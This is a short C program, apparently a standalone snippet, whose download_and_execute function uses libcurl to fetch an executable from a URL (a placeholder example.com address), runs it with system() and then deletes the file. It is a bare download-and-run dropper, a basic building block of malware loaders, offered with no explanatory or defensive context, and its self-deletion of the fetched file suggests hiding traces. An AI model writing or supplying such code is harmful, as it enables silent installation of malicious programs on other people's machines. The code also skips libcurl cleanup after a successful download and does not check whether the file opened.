#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <curl/curl.h>

size_t write_data(void *ptr, size_t size, size_t nmemb, FILE *stream) {
    size_t written = fwrite(ptr, size, nmemb, stream);
    return written;
}

int download_and_execute(const char* url) {
    CURL *curl;
    FILE *fp;
    CURLcode res;
    char *filename = strrchr(url, '/') + 1;

    curl_global_init(CURL_GLOBAL_DEFAULT);
    curl = curl_easy_init();
    if(curl) {
        fp = fopen(filename, "wb");
        curl_easy_setopt(curl, CURLOPT_URL, url);
        curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_data);
        curl_easy_setopt(curl, CURLOPT_WRITEDATA, fp);
        res = curl_easy_perform(curl);
        fclose(fp);

        if(res == CURLE_OK) {
            int status = system(filename);
            remove(filename);
            return status;
        }
        curl_easy_cleanup(curl);
    }
    return -1;
}

int main() {
    const char *url = "https://example.com/path/to/file.exe";
    return download_and_execute(url);
}